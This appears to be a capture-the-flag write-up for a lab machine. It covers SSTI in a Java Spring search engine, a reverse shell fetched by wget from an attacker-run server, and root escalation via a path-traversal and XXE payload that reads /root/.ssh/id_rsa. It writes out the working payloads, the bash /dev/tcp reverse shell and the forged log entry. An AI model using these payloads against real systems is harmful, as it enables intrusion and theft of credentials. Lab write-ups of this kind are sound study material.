## NMAP

TCP Ports available: 22, 8080 

8080 has a website on it. 

The website on port 8080 shows a search engine.
Looking at the code, it is clear that the backend is based on Java Spring.

## Parameters Fuzzing

The POST request of the search engine has a single `name` parameter.
Fuzzing it via Burp suite using all possible payloads we get some errors with certain chars.
Moreover inserting `7*7` in the search bar, we get `49` showing that there is a template engine interpreting chars.

It looks like the website is vulnerable to SSTI.

## Server-Side Template Injection

Several payloads from https://book.hacktricks.xyz/pentesting-web/ssti-server-side-template-injection are attempted with multiple combination of charachters and it looks like the following one can actually succeed.

```java
*{T(java.lang.Runtime).getRuntime().exec('id')}
```

Injecting a full reverse shell command does not work as charachters like `&` are forbidden. So we need to create a script and deliver it via webserver.

## Deliver the Reverse Shell

```shell
echo "bash -i >& /dev/tcp/10.10.14.35/3333 0>&1" > rev.sh
php -S 0.0.0.0:8000
```

On the client side the reverse shell must be waiting

```shell
nc -lvnp 3333
```

So we can push the script to the server and run it.

```java
*{T(java.lang.Runtime).getRuntime().exec('wget http://10.10.14.35:8000/rev.sh')}
*{T(java.lang.Runtime).getRuntime().exec('chmod +x rev.sh')}
*{T(java.lang.Runtime).getRuntime().exec('bash rev.sh')}
```

And we obtain a user shell with the corresponding `flag.txt` file in the home directory

We are going to run the https://linpeas.sh/script to enumerate the system. 

## Linpeas

It reveals that the current website is running via root using:

```shell
sudo -u woodenk -g logs ...
```

Which means that the website runs as the user `woodenk` and group `logs`.

Moreover it reveals files into the `/credits` directory that are not accessible by non-root users that do not belong to the `logs` group. The files inside are only writeable by `root`.

## Opening SSH

We can open an `ssh` connection by adding our public key into `~/.ssh/authorized_keys` in the user home, but this is only good for convenience, to get a powerful shell. 

**The reverse shell is still useful because of the `logs` group that allows us additional permissions over the file system! We need to work with it!** 

## Vulnerable Logs

Another interesting file is `/opt/panda_search/redpanda.log` which is a log readable by everybody and writable by `root` and the `logs` group. 

## Code Analysis

The code of the website is available in /opt. There are two components.

1) The `panda_search` website itself
2) The `logparser` script 

The second one has the code in `/opt/logparser` where we understand that the script must be executed with `root` privileges to be able to write into the `*_creds.xml` in `/credits`.

Doing some tests we see that every time that an image is found in the search engine:

- The `redpanda.log` is updated with a message
- The `logparser` program reads periodically `redpanda.log` and updates the xml files with `root` privileges

This seems to be a possible attack channel! 

## Exploit

Studying the code of `logparser` we understand that:

1) The author name is taken from the picture metadata
2) The output file path is built using the name taken from the picture metadata
3) The XML results file is read before updating it with the new data
4) There is no check on any field!

We can exploit the XML XXE vulnerability if we find a way to enforce the read operation on our XML file instead of the correct one!

So the exploit works by:

1) Place the XML file in a user controllable path like `/tmp`
2) Place an image file in `/tmp` too
3) Put a relative image path into `redpanda.log` so that combined with the path in the Java code, the evil-crafted image is taken
4) Change the Artist metadata in the picture with the relative path of the evil xml file so that combined with the path in the Java code, the evil-crafted xml is taken

The evil XML and JPG can be crafte remotely and served via the php server as above.

To update the metadata in the image, say `greg.jpg` use the following:

```shell
exiftool -Artist='../tmp/evil' greg.jpg
```

Notice that the code will concatenate the Artist name in the following way:

```java
'/credits/' + Artist + '_creds.xml'
```

So the artist must be crafted according to the real xml file name.
Then create an XML file `evil_creds.xml` with the following content:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<!DOCTYPE foo [
   <!ELEMENT foo ANY >
   <!ENTITY xxe SYSTEM "file:///root/.ssh/id_rsa" >]>
<credits>
  <author>gg</author>
  <image>
    <uri>/../../../../../../tmp/greg.jpg</uri>
    <views>1</views>
    <foo>&xxe;</foo>
  </image>
  <totalviews>2</totalviews>
</credits>
```

Notice that the URI file path must be relative to the img folder into `/tmp` as this will be checked by the code. If it's wrong it won't work.

Now add the same image path into a fake string into `redpanda.log`:

```
200|somestuff|someotherstuff|/../../../../../../tmp/greg.jpg
```

Notice that the url path requires a starting slash as the code will not add that.

Now add that line into `redpanda.log` and... wait!

Once the `loparser` runs the exploit will work and the XXE vulnerability will update the XML file with the content of `/root/.ssh/id_rsa` which can be used to connect via ssh as root and get the root flag!